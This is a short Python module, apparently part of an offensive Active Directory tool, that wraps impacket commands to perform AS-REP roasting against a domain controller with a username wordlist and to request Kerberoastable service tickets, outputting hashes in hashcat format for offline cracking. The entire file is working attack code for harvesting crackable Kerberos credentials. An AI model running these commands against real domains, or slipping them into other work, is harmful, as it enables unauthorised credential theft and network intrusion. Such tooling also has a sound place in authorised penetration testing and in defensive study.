import subprocess
from core import aux

def unauthenticated_asrep(target, domain, wordlist):

    cmd = [
        "impacket-GetNPUsers",
        f"{domain.upper()}/",
        "-dc-ip", target,
        "-usersfile", wordlist,
        "-format", "hashcat",
        "-no-pass"
    ]

    output = aux.run_command(cmd)
    return output

def unauthenticated_kerberoast(target, domain):

    cmd = [
        "impacket-GetUserSPNs",
        "-request",
        "-dc-ip", target,
        f"{domain.upper()}/"
    ]

    output = aux.run_command(cmd)

    return output